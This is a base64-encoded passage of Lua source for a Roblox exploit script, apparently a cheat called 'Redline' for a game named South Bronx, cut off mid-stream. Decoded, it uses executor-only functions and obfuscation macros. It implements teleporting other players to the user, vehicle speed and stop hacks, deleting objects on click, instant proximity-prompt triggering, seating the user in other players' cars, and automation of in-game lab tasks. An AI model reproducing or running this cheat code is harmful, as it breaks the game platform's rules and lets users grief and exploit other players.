90IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5Tb3V0aF9Ccm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKS5DRnJhbWUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKS5DRnJhbWUgKyBWZWN0b3IzLm5ldygyLCAwLCAwKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCiAgICAgICAgICAgIAogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguVmVoaWNsZU1vZGlmaWNhdGlvbnMuU3BlZWRFbmFibGVkIGFuZCBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuVykgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIHR5cGVvZihMb2NhbFBsYXllci5DaGFyYWN0ZXIpID09ICJJbnN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBIdW1hbm9pZCBhbmQgdHlwZW9mKEh1bWFub2lkKSA9PSAiSW5zdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdFBhcnQgPSBIdW1hbm9pZC5TZWF0UGFydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBTZWF0UGFydCBhbmQgdHlwZW9mKFNlYXRQYXJ0KSA9PSAiSW5zdGFuY2UiIGFuZCBTZWF0UGFydDpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VhdFBhcnQuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSAqPSBWZWN0b3IzLm5ldygxICsgQ29uZmlnLlNvdXRoX0Jyb254LlZlaGljbGVNb2RpZmljYXRpb25zLlNwZWVkVmFsdWUsIDEsIDEgKyBDb25maWcuU291dGhfQnJvbnguVmVoaWNsZU1vZGlmaWNhdGlvbnMuU3BlZWRWYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwKQogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5WZWhpY2xlTW9kaWZpY2F0aW9ucy5CcmVha0VuYWJsZWQgYW5kIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5TKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgdHlwZW9mKExvY2FsUGxheWVyLkNoYXJhY3RlcikgPT0gIkluc3RhbmNlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgSHVtYW5vaWQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEh1bWFub2lkIGFuZCB0eXBlb2YoSHVtYW5vaWQpID09ICJJbnN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBTZWF0UGFydCA9IEh1bWFub2lkLlNlYXRQYXJ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFNlYXRQYXJ0IGFuZCB0eXBlb2YoU2VhdFBhcnQpID09ICJJbnN0YW5jZSIgYW5kIFNlYXRQYXJ0OklzQSgiVmVoaWNsZVNlYXQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZWF0UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ICo9IFZlY3RvcjMubmV3KDEgLSBDb25maWcuU291dGhfQnJvbnguVmVoaWNsZU1vZGlmaWNhdGlvbnMuQnJlYWtWYWx1ZSwgMSwgMSAtIENvbmZpZy5Tb3V0aF9Ccm9ueC5WZWhpY2xlTW9kaWZpY2F0aW9ucy5CcmVha1ZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAKICAgICAgICAgICAgVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oSW5wdXQsIEdhbWVQcm9jZXNzZWRFdmVudCkKICAgICAgICAgICAgICAgIGlmIElucHV0LktleUNvZGUgPT0gQ29uZmlnLlNvdXRoX0Jyb254LlZlaGljbGVNb2RpZmljYXRpb25zLkluc3RhbnRTdG9wQmluZCBhbmQgQ29uZmlnLlNvdXRoX0Jyb254LlZlaGljbGVNb2RpZmljYXRpb25zLkluc3RhbnRTdG9wIGFuZCAobm90IEdhbWVQcm9jZXNzZWRFdmVudCkgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0eXBlb2YoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSA9PSAiSW5zdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEh1bWFub2lkIGFuZCB0eXBlb2YoSHVtYW5vaWQpID09ICJJbnN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlYXRQYXJ0ID0gSHVtYW5vaWQuU2VhdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBTZWF0UGFydCBhbmQgdHlwZW9mKFNlYXRQYXJ0KSA9PSAiSW5zdGFuY2UiIGFuZCBTZWF0UGFydDpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZWF0UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ICo9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlYXRQYXJ0LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ICo9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguTG9jYWxQbGF5ZXJfQ29uZmlnLkRlbGV0ZUtleSB+PSBuaWwgYW5kIElucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBhbmQgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oQ29uZmlnLlNvdXRoX0Jyb254LkxvY2FsUGxheWVyX0NvbmZpZy5EZWxldGVLZXkpIGFuZCBDb25maWcuU291dGhfQnJvbnguTG9jYWxQbGF5ZXJfQ29uZmlnLkRlbGV0ZU9uS2V5IGFuZCAobm90IEdhbWVQcm9jZXNzZWRFdmVudCkgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIE1vdXNlIGFuZCBNb3VzZS5UYXJnZXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBNb3VzZS5UYXJnZXQ6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgUHJveGltaXR5UHJvbXB0U2VydmljZS5Qcm9tcHRCdXR0b25Ib2xkQmVnYW46Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihQcm9tcHQsIFBsYXllcikKICAgICAgICAgICAgICAgIGlmIFByb21wdCBhbmQgUGxheWVyID09IExvY2FsUGxheWVyIGFuZCBmaXJlcHJveGltaXR5cHJvbXB0IHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguTG9jYWxQbGF5ZXJfQ29uZmlnLkluc3RhbnRJbnRlcmFjdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoUHJvbXB0KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgZ2V0Z2VudigpLkZpbmRfQmlrZSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiT3duZXIiKSBhbmQgc3RyaW5nLm1hdGNoKHRvc3RyaW5nKFZhbHVlKSwgTG9jYWxQbGF5ZXIuTmFtZS4uIidzIENhciIpIGFuZCBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQm9keSIpOkZpbmRGaXJzdENoaWxkKCJQYXNzZW5nZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBWYWx1ZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBGaW5kU2VhdEluUGxheWVyc0NhciA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKENhcikKICAgICAgICAgICAgICAgIGZvciBfSW5kZXgsIF9WYWx1ZSBpbiBDYXIuQm9keTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgX1ZhbHVlOklzQSgiU2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1ZhbHVlLk9jY3VwYW50IH49IG5pbCB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBfVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgZ2V0Z2VudigpLlNpdEluUGxheWVyc1ZlaGljbGUgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihQbGF5ZXIpCiAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyLkNoYXJhY3RlciBvciBQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNlYXRQYXJ0ID09IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgU2VhdFBhcnQgPSBQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNlYXRQYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCBQYXJlbnQgPSBTZWF0UGFydC5QYXJlbnQKICAgICAgICAgICAgICAgIHdoaWxlIFBhcmVudCBkbwogICAgICAgICAgICAgICAgICAgIGlmIHN0cmluZy5tYXRjaCh0b3N0cmluZyhQYXJlbnQpLCAiJ3MgQ2FyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTZWF0ID0gRmluZFNlYXRJblBsYXllcnNDYXIoUGFyZW50KQogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgICAgICBTZWF0OlNpdChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gUGFyZW50LlBhcmVudAoKICAgICAgICAgICAgICAgICAgICBpZiBQYXJlbnQgPT0gZ2FtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIFNlYXQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgVGVsZXBvcnRfU3RhdHVzOwoKICAgICAgICAgICAgbG9jYWwgR2V0RGlzdGFuY2UgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihwb3NpdGlvbjEsIHBvc2l0aW9uMikKICAgICAgICAgICAgICAgIHJldHVybiAocG9zaXRpb24xIC0gcG9zaXRpb24yKS5NYWduaXR1ZGUKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgR2V0VHdlZW5TcGVlZCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKGRpc3RhbmNlKQogICAgICAgICAgICAgICAgbG9jYWwgYmFzZVRpbWUgPSA0LjUKICAgICAgICAgICAgICAgIGxvY2FsIHRpbWVUb1R3ZWVuID0gYmFzZVRpbWUgKiAoZGlzdGFuY2UgLyA1MCkKICAgICAgICAgICAgICAgIHJldHVybiB0aW1lVG9Ud2VlbgogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBIaWRlVUkgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihUaXRsZSwgVGltaW5nKQogICAgICAgICAgICAgICAgZ2V0Z2VudigpLkhpZGVTY3JlZW5HVUkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICAgICAgICAgICAgICBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSS5OYW1lID0gZ2V0ZXhlY3V0b3JuYW1lKCkKICAgICAgICAgICAgICAgIGdldGdlbnYoKS5IaWRlU2NyZWVuR1VJLlBhcmVudCA9IGdldGh1aSBhbmQgZ2V0aHVpKCkgb3IgU2VydmljZXMuQ29yZUd1aQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgICAgICAgICBmcmFtZS5OYW1lID0gIkJsYWNrRnJhbWUiCiAgICAgICAgICAgICAgICBmcmFtZS5TaXplID0gVURpbTIubmV3KDIsIDAsIDIsIDApIAogICAgICAgICAgICAgICAgZnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgLTE1NSwgMCwgLTE1NSkgCiAgICAgICAgICAgICAgICBmcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkgCiAgICAgICAgICAgICAgICBmcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgZnJhbWUuUGFyZW50ID0gZ2V0Z2VudigpLkhpZGVTY3JlZW5HVUkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCB0ZXh0TGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuTmFtZSA9ICJcbmhpZGV1aWFldGhyYSIKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5TaXplID0gVURpbTIubmV3KDAsIDQwMCwgMCwgMTAwKQogICAgICAgICAgICAgICAgdGV4dExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2Fuc0JvbGQKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5SaWNoVGV4dCA9IHRydWUKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0ID0gJzxmb250IGNvbG9yPSJyZ2IoMjU1LDI1NSwyNTUpIj5SZWRsaW5lPC9mb250PlxuJyAuLiBUaXRsZQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgdGV4dExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuVGV4dFNpemUgPSAzNgogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjggCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5DZW50ZXIKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0V3JhcHBlZCA9IHRydWUKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlBhcmVudCA9IGdldGdlbnYoKS5IaWRlU2NyZWVuR1VJCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgVGltaW5nIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGVuZFRpbWUgPSBzdGFydFRpbWUgKyBUaW1pbmcKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGljaygpIDwgZW5kVGltZSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGltZUxlZnQgPSBlbmRUaW1lIC0gdGljaygpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc8Zm9udCBjb2xvcj0icmdiKDI1NSwyNTUsMjU1KSI+UmVkbGluZS48L2ZvbnQ+XG4lc1xucGxlYXNlIHdhaXQgOiA8Zm9udCBjb2xvcj0icmdiKDI1NSwyNTUsMjU1KSI+JS4yZjwvZm9udD4gc2Vjb25kcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGl0bGUsIG1hdGgubWF4KHRpbWVMZWZ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJldHVybiB0ZXh0TGFiZWwKICAgICAgICAgICAgZW5kKSAgICAgICAgICAgIAoKICAgICAgICAgICAgRGVsZXRlU2VjcmV0VUkgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihUaXRsZSkKICAgICAgICAgICAgICAgIGlmIGdldGdlbnYoKS5IaWRlU2NyZWVuR1VJIHRoZW4KICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSTpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSSA9IG5pbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGZvciBpLHYgaW4gZ2V0aHVpKCk6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gZ2V0ZXhlY3V0b3JuYW1lKCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdjpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIHRwX2RlYm91bmNlID0gZmFsc2UKCiAgICAgICAgICAgIGxvY2FsIEdldEN1dHRpbmdCb2FyZCwgR2V0Qm93bCwgR2V0UG90LCBDaGVja0hvYm8sIEdldEhvdXNlID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2UuTWFwLkxvY2F0aW9uc1siVGhlIExhYm9yYXRvcnkiXVsiQ3V0dGluZyBCb2FyZHMiXTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUHJvbXB0ID0gVmFsdWU6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgaWYgUHJvbXB0IGFuZCBQcm9tcHQuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBWYWx1ZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCksIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLk1hcC5Mb2NhdGlvbnNbIlRoZSBMYWJvcmF0b3J5Il0uQm93bHM6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIFByb21wdCA9IFZhbHVlOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpCgogICAgICAgICAgICAgICAgICAgIGlmIFByb21wdCBhbmQgUHJvbXB0LkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gVmFsdWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpLCBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFdvcmtzcGFjZS5NYXAuTG9jYXRpb25zWyJUaGUgTGFib3JhdG9yeSJdLkV4dHJhOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5OYW1lID09ICJUYWJsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZS5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLk1hcC5Mb2NhdGlvbnNbIlRoZSBMYWJvcmF0b3J5Il0uUG90czpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUHJvbXB0ID0gVmFsdWU6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgaWYgUHJvbXB0IGFuZCBQcm9tcHQuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBWYWx1ZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCksIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKE5hbWUpCiAgICAgICAgICAgICAgICBpZiBXb3Jrc3BhY2UuRm9sZGVycy5Ib21lbGVzc1Blb3BsZTpGaW5kRmlyc3RDaGlsZChOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUHJvbXB0ID0gV29ya3NwYWNlLkZvbGRlcnMuSG9tZWxlc3NQZW9wbGU6RmluZEZpcnN0Q2hpbGQoTmFtZSk6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgaWYgUHJvbXB0IGFuZCBQcm9tcHQuRW5hYmxlZCBhbmQgV29ya3NwYWNlLkZvbGRlcnMuSG9tZWxlc3NQZW9wbGU6RmluZEZpcnN0Q2hpbGQoTmFtZSkuTGVmdExvd2VyTGVnLlJvdGF0aW9uLlggPT0gOTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgICAgIGVuZCksIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLk1hcC5BUFRTOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgi